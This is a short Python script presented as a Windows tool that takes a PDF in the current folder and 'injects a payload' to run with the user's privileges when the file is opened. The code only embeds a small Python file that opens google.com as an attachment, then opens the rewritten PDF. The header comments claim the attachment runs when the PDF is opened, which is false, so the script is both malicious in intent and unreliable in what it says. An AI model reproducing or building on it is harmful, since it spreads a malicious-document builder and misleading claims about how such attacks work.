# windows program that looks for a pdf in the current directory and injects a payload into it
# the payload is a python script that will be executed when the pdf is opened
# the payload will be executed with the same privileges as the user that opened the pdf

import os
import sys
import PyPDF2
import random
import string
import subprocess

# get the current directory in windows
current_dir = os.getcwd()

# get the list of files in the current directory
files = os.listdir(current_dir)

# look for a pdf file in the current directory
for file in files:
    if file.endswith(".pdf"):
        # open the pdf file
        pdf_file = open(file, "rb")
        pdf_reader = PyPDF2.PdfFileReader(pdf_file)
        pdf_writer = PyPDF2.PdfFileWriter()

        # get the number of pages in the pdf
        num_pages = pdf_reader.getNumPages()

        # loop through all the pages in the pdf
        for page in range(num_pages):
            # get the current page
            pdf_page = pdf_reader.getPage(page)

            # add the current page to the pdf writer
            pdf_writer.addPage(pdf_page)

        # generate a random name for the payload
        payload_name = ''.join(random.choice(string.ascii_lowercase) for i in range(8)) + ".py"

        # create the payload which will be executed when the pdf is opened
        # the payload will open a web page
        payload = open(payload_name, "w")
        payload.write("import webbrowser as wb \r wb.open('http://www.google.com')")
        payload.close()

        # add the payload to the pdf
        pdf_writer.addAttachment(payload_name, open(payload_name, "rb").read())

        # create a new pdf file with the payload
        new_pdf = open("new_" + file, "wb")
        pdf_writer.write(new_pdf)

        # close the pdf file
        pdf_file.close()

        # close the new pdf file
        new_pdf.close()

        # delete the payload
        os.remove(payload_name)

        # open the new pdf file
        subprocess.Popen("new_" + file, shell=True)

        # exit the program
        sys.exit(0)

# if no pdf file was found in the current directory
print("No pdf file found in the current directory")

# exit the program
sys.exit(0)